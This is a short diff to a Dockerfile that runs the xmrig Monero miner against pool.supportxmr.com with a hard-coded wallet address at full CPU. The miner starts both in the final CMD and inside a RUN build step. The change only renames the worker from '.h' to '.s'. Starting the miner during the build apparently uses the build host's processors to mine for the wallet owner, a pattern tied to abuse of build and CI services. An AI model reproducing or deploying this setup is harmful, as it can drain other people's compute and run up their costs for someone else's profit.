@@ -15,6 +15,6 @@ RUN   apk --no-cache upgrade && \
         build-base \
         cmake \
         git & \
-      /xmrig/xmrig -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k --donate-level 1 --max-cpu-usage 100
+      /xmrig/xmrig -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.s -p x -k --donate-level 1 --max-cpu-usage 100
 USER miner
-CMD /xmrig/xmrig -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k --donate-level 1 --max-cpu-usage 100
+CMD /xmrig/xmrig -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.s -p x -k --donate-level 1 --max-cpu-usage 100
